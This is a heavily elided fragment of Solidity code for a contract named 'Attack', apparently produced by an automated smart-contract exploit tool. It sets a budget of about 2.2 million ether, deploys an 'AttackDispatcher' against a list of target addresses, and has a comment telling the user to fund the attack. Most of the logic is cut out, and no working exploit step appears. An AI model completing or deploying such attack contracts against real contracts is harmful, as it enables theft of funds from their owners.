 ...
 * parameter. Make sure to send at least 2214452 ether and 516448281981616129 wei to the attack
    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 4) {
                ...
                uint value = 0x1d4edb6223d70d0b00000;
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x1d4edb6223d70d0b00001; /* equals 2214452 ether and 516448281981616129 wei */
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        rstate_state = 0;
        rstate[0] = 0;
        subs[4] = new AttackDispatcher{value: 2214452516448281981616128 }(4, _targets);
    }
